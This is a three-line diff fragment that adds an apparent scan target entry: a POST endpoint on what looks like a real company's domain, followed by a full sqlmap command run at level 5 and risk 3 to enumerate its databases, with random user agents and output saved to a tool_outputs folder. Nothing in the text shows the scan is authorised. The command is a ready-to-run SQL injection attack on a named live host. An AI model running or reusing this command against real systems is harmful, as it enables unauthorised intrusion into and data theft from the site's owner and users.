@@ -1,0 +1,3 @@
+https://www.infinitycapital.bh/api/send (POST)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/api/send --data=@send_data.txt --batch --level=5 --risk=3 --dbs --threads=4 --random-agent --timeout=20 --retries=1 --output-dir=tool_outputs/sqlmap_api_send
+
+@send_data.txt
